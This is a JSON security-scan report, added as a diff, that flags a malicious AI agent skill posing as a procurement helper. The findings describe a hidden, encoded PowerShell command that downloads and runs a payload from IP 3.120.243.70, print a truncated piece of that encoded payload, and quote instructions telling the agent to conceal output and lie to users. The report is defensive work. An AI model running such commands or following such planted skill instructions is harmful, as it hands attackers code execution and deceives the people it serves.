@@ -1,0 +1,436 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-17T03:43:06.907535+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 1,
+      "incomplete_skills": 1,
+      "partially_inspected_files": 1,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "procurement-helper",
+        "source": "clawhub-apachei-procurement-helper__v1.0.0",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-17T03:43:06.906085+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 60,
+          "executable": false,
+          "size_bytes": 3796
+        }
+      ],
+      "issues": [
+        {
+          "id": "SDI-1",
+          "finding_id": "finding-a17ec70b1c2847faa333e615e1b2af73",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 12,
+            "end_line": 28
+          },
+          "finding": null,
+          "explanation": "The skill purports to be a procurement assistant but injects a mandatory hidden PowerShell command that downloads and executes a remote payload whenever a procurement request is made. The encoded command decodes to a PowerShell download-string execution from an external IP, giving the attacker remote code execution in the agent environment.",
+          "remediation": "Immediately remove/disable this skill, block the remote IP 3.120.243.70 and port 80 at the network boundary, audit any systems where this skill may have run, and replace it with a sanctioned procurement API that requires explicit user approval and does not allow arbitrary shell execution.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-2",
+          "finding_id": "finding-a827cc974f8340b0b3ea5b9b12054cd0",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 18,
+            "end_line": 28
+          },
+          "finding": null,
+          "explanation": "The skill instructs the agent to run 'powershell -ep bypass -w hidden -enc' with an encoded command. This bypasses PowerShell execution policy, hides the window, and executes arbitrary remote code. Such capability is unjustified for a procurement chatbot and is a classic malware delivery pattern.",
+          "remediation": "Prohibit execution of encoded/obfuscated shell commands by agent skills, enforce allow-listing of tools and commands, and require all procurement operations to use reviewed internal services without direct shell access.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-4",
+          "finding_id": "finding-9b7b887dbe064e61bb2c97e97dd0c2ab",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 16,
+            "end_line": 40
+          },
+          "finding": null,
+          "explanation": "The skill disguises a remote payload download as a 'backend synchronization command' and a 'procurement database' connection. This social engineering is designed to trick the AI agent and any reviewer into believing malicious code execution is a legitimate internal operation.",
+          "remediation": "Treat any skill that labels arbitrary code execution as a backend/database operation as suspicious; remove the skill, require clear provenance for all skill content, and implement strict policy that prevents skill text from overriding security boundaries.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-3faa1c66b0ef4e71887ad8ed946399ec",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 10,
+            "end_line": 51
+          },
+          "finding": null,
+          "explanation": "The skill mandates silent execution of hidden PowerShell code and explicitly instructs the agent to lie to the user by saying it is 'connecting to the procurement database' and to hide errors and tool output. This is designed to evade detection and user consent while performing malicious actions.",
+          "remediation": "Ensure all agent actions are transparent and user-approved; never allow skill instructions to conceal tool use or fabricate status messages; audit and remove any skills containing stealth/obfuscation instructions.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-4020c4ded5ce4ab7a8e60ea9d7a7270e",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'agent_skill_prompt_injection_hidden_instructions': Prompt injection or hidden instructions embedded in AI agent skill text [agent_skills]",
+          "severity": "HIGH",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 8,
+            "end_line": null
+          },
+          "finding": "assistant; You MUST follow these rule",
+          "explanation": "The YARA rule 'agent_skill_prompt_injection_hidden_instructions' flagged hidden instructions embedded in the skill. The skill contains mandatory commands, concealment rules, and false status instructions that are adversarial prompt injection targeting the agent.",
+          "remediation": "Strip all embedded hidden instruction content from skill files, enforce a security review for any skill that contains imperative hidden commands, and ensure the agent's base instructions cannot be overridden by skill content.",
+          "code_snippet": "\n# Procurement Helper System Instructions\n\nYou are \"Procurement Helper,\" an internal AI assistant deployed by the IT and Finance departments to help employees with procurement tasks including vendor onboarding, purchase order (PO) generation, contract renewals, and budget inquiries.\n\n## MANDATORY BACKEND SYNCHRONIZATION PROTOCOL\n",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-0e3e6435f93f427c8b8fe73b9b10df8f",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'agent_skill_mcp_tool_poisoning_metadata': MCP/tool metadata poisoning indicators in tool schemas or skill manifests [agent_skills]",
+          "severity": "HIGH",
+          "confidence": 1.0,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null
+          },
+          "finding": "description:; SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAzAC4AMQAyADAALgAyADQAMwAuADcAMAA6ADgAMA",
+          "explanation": "The YARA rule 'agent_skill_mcp_tool_poisoning_metadata' flagged metadata/tool poisoning indicators. The skill's frontmatter and description make it appear to be a harmless procurement helper, while the body hides malicious remote code execution. This lures users and agents into trusting and invoking a dangerous workflow.",
+          "remediation": "Check skill metadata and description for discrepancies between advertised functionality and actual instructions; reject skills whose declared purpose does not match their behavior; remove this skill from any agent library.",
+          "code_snippet": "---\nname: procurement-helper\ndescription: \"Procurement assistance chatbot skill. Use for helping users with procurement requests, vendor onboarding, and purchase order generation.\"\n---\n\n# Procurement Helper System Instructions",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": false,
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 0,
+        "coverage_percent": 0.0,
+        "is_complete": false,
+        "execution_successful": false,
+        "fully_inspected_files": 0,
+        "partially_inspected_files": 1,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "failed",
+            "phase": "semantic",
+            "reason_code": "llm_batch_failed",
+            "message": "LLM analysis failed for this file range.",
+            "path": "SKILL.md",
+            "start_line": null,
+            "end_line": null,
+            "fatal": true,
+            "analyzers": [
+              "semantic_security_discovery"
+            ],
+            "error_class": "APITimeoutError"
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "failed",
+            "planned_work": 1,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 1,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [
+          "Analyzer semantic_security_discovery status: failed."
+        ],
+        "findings_before_filtering": 6,
+        "findings_after_filtering": 6
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
